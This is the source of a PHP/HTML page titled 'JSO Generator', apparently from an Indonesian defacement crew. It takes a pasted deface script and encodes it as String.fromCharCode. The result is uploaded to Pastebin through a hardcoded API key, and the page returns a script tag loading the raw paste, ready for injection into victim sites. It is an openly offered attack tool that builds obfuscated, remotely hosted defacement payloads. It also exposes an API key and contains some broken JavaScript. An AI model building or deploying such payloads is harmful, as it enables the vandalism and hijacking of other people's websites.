<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>JSO Generator</title>
	<link href="https://fonts.googleapis.com/css?family=Fredoka+One&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Caveat&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Dokdo|Gloria+Hallelujah|Indie+Flower|Permanent+Marker" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Righteous" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2P|Rationale" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Chewy" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Permanent+Marker|Righteous" rel="stylesheet">
	<script type="text/javascript">
		function copy_text() {
			document.getElementById("pilih").select();
			document.execCommand("copy");
			alert("Text berhasil dicopy Cuk");
		}
	</script>
	<style>
	body {
		background-color:#0000FF;
		color:white;
		font-family: 'Permanent Marker', cursive;
	}
	.head {
		font-family: 'Permanent Marker', cursive;
		text-shadow: 4px 1px red;
	}
	.textarea {
		width: 200px;
		height: 100px;
		border-radius: 10px;
		border-style: unset;
	}
	.btn {
		border-radius: 3px;
		background-color: white;
		border-style: unset;
		font-family: 'Fredoka One', cursive;
	}
	.foot {
		font-family: 'Caveat', cursive;
		text-shadow: 4px 1px red;
	}
	.ress {
		font-size: 20px;
    	color: aqua;
		font-family: 'Fredoka One', cursive;
	}
	</style>
    <script>
		function runCharCodeAt() {
			input = document.charCodeAt.input.value;
			output = "";
			for(i=0; i<input.length; ++i) {
				if (output != "") output += ", ";
				output += input.charCodeAt(i);
			}
			document.charCodeAt.output.value = output;
		}
	</script>
</head>
<body>
<center>
<h1 class="head">Make Script JSO</h1>
<form name="charCodeAt" method="post">
		<textarea name="input" class="textarea" placeholder="Paste Sc Deface/Codingan Web Disini"></textarea><br><br>
		<input type="button" onclick="runCharCodeAt()" value="Char" class="btn"><br><br>
		<textarea name="output" class="textarea"></textarea><br><br>
		<input type="submit" name="submit" value="Buat" class="btn"><br><br>
			      <center>
	<div style="text-shadow: 5px 5px 5px #000000;">
	<font color="SpringGreen" size="4" face="Chewy">
	<script language="JavaScript">
	var text=" <br>UNITED MASTER CYBER TOOLS<br>"
	var delay=50;
	var currentChar=1;
	var destination="[none]";
	function type()
	{
	//if (document.all)
	{
	var dest=document.getElementById(destination);
	if (dest)// && dest.innerHTML)
	{
	dest.innerHTML=text.substr(0,currentChar)+"<blink>_</blink>";
	currentChar++;
	if (currentChar>text.length)
	{
	currentChar=1;
	setTimeout("type()",5000);
	}
	else
	{
	setTimeout("type()",delay);
	}
	}
	}
	} 
	function startTyping(textParam,delayParam,destinationParam)
	{
	text=textParam;
	delay=delayParam;
	currentChar=1;
	destination=destinationParam;
	type();
	}
	</script>
	
	<b><div id="textDestination" style="background-color:Blue"; style="font: 50px Arial color:blue; margin:0px;"></div></b>
	<script language="JavaScript">
	javascript:startTyping(text,50,"textDestination");
	</script></div>
	<br><script type="text/javascript">
	fl=1
	function f1()
	function f(){
	if(fl==1)
	{
	Bn.style.top=100
	Bn.style.left=600
	fl=2
	}
	else if(fl==2)
	{
	Bn.style.top=600
	Bn.style.left=50
	fl=3
	}
	else if(fl==5)
	{
	Bn.style.top=200
	Bn.style.left=500
	fl=
	}
	}
	</script></font>
</form>
<?php 

if (isset($_POST['submit'])) {
	if (empty($_POST['output'])) {
		echo "<script>alert('Convert Dulu Anjenk');</script>";
	}else{

$isi = $_POST['output'];
$random = rand(1, 99999999);
$api_dev_key 			= '633fcbdacbff82bfd5dd821a9f8921f7'; // your api_developer_key
$api_paste_code 		= "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
$api_paste_private 		= '0'; // 0=public 1=unlisted 2=private
$api_paste_name			= $random; // name or title of your paste
$api_paste_expire_date 		= 'N';
$api_paste_format 		= 'text';
$api_user_key 			= ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
$api_paste_name			= urlencode($api_paste_name);
$api_paste_code			= urlencode($api_paste_code);

$url 				= 'https://pastebin.com/api/api_post.php';
$ch 				= curl_init($url);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1); 
curl_setopt($ch, CURLOPT_NOBODY, 0);

$response  			= curl_exec($ch);
$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
$respak = '<script type="text/javascript" src="'.$hasil.'"></script>';
$kk = htmlspecialchars($respak);
echo "<h1 class='ress'>Result:</h1>";
echo "<input type='text' value='$kk' id='pilih' readonly />";
echo "<button type='button' onclick='copy_text()'>Copy</button>";
}}
echo "<h2 class='foot'>@2k19 Codded By TuanSadboys</h2>";

?>

</body>
</html>